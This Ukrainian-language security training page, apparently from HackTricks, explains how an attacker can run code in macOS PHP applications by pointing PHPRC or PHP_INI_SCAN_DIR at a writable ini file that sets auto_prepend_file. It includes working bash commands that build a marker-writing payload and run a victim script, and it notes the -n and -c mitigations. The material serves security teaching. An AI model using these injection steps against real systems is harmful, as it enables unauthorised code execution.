# Ін’єкція в PHP-застосунки macOS

{{#include ../../../banners/hacktricks-training.md}}

## `PHPRC` / `PHP_INI_SCAN_DIR` і `auto_prepend_file`

PHP CLI і CGI читають конфігурацію під час кожного запуску. `PHPRC` може вказувати на доступний для запису зловмисником `php.ini`, тоді як `PHP_INI_SCAN_DIR` може перенаправити каталог, у якому скануються додаткові файли `.ini`. Директива `auto_prepend_file` змушує PHP обробити файл перед запитаним скриптом, тому ця комбінація стає способом виконання коду під час запуску.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```
Альтернативою є каталог, що містить файл `.ini`:
```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```
Опція `-n` ігнорує `php.ini`; явно вказаний довірений шлях через `-c` має пріоритет над `PHPRC`. Пам’ятайте, що довгоживучий серверний SAPI зазвичай зчитує конфігурацію під час запуску вебсервера, тоді як CLI та CGI роблять це під час кожного виклику.<sup>[[1]](#references)</sup>

## References

- [1] [Файл конфігурації PHP](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
{{#include ../../../banners/hacktricks-training.md}}
